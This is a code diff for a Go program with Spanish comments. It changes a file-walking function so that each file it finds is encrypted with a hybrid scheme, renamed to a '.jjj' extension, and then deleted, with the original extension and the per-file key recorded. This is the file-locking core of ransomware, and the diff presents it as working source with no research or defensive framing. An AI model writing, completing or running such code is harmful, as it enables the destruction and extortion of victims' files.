@@ -13,14 +13,17 @@ import (
 	"fmt"
 	"log"
 	"math/big"
+	"strings"
 	"os"
 	"path/filepath"
 )
 
 type EncryptionInfo struct {
-	Path string `json:"path"`
-	Key  []byte `json:"key"`
+	Path    string `json:"path"`
+	Key     []byte `json:"key"`
+	OrigExt string `json:"orig_ext,omitempty"` // Almacena la extensión original (ej. ".txt")
 }
+
 
 type EncryptionInfos []EncryptionInfo
 
@@ -150,37 +153,46 @@ func main() {
 }
 
 func walker(path string, info os.FileInfo, err error) error {
-    if err != nil {
-        log.Println("Error on:", path)
-        return err
-    }
-    if info.IsDir() {
-        log.Println(path, "(d)")
-        return nil
-    }
-    log.Println(path, "(f)")
-    bs, err := os.ReadFile(path)
-    if err != nil {
-        log.Println("Error al leer el archivo:", path, err)
-        return err
-    }
-    cbs, k := encryptHybrid(clientKey, bs)
+	if err != nil {
+		log.Println("Error en:", path)
+		return err
+	}
+	if info.IsDir() {
+		log.Println(path, "(d)")
+		return nil
+	}
+	log.Println(path, "(f)")
+	
+	// Leer el contenido original
+	bs, err := os.ReadFile(path)
+	if err != nil {
+		log.Println("Error al leer el archivo:", path, err)
+		return err
+	}
+	
+	// Encriptar el contenido
+	cbs, k := encryptHybrid(clientKey, bs)
 
-    // Crear el nuevo nombre: se añade ".jjj" y se elimina la extensión anterior
-    newPath := path + ".jjj"
-    err = os.WriteFile(newPath, cbs, 0666)
-    if err != nil {
-        log.Println("Error al escribir el archivo encriptado:", newPath, err)
-        return err
-    }
-    eis = append(eis, EncryptionInfo{Path: newPath, Key: k})
+	// Extraer la extensión original y obtener el nombre base
+	ext := filepath.Ext(path)
+	base := strings.TrimSuffix(path, ext)
+	newPath := base + ".jjj" // Se elimina la extensión original y se agrega ".jjj"
 
-    // Eliminar el archivo original para que solo quede el archivo encriptado
-    err = os.Remove(path)
-    if err != nil {
-        log.Println("Error al eliminar el archivo original:", path, err)
-        return err
-    }
+	// Escribir el archivo encriptado
+	err = os.WriteFile(newPath, cbs, 0666)
+	if err != nil {
+		log.Println("Error al escribir el archivo encriptado:", newPath, err)
+		return err
+	}
+	// Guardar la información junto con la extensión original
+	eis = append(eis, EncryptionInfo{Path: newPath, Key: k, OrigExt: ext})
 
-    return nil
+	// Eliminar el archivo original
+	err = os.Remove(path)
+	if err != nil {
+		log.Println("Error al eliminar el archivo original:", path, err)
+		return err
+	}
+	return nil
+
 }
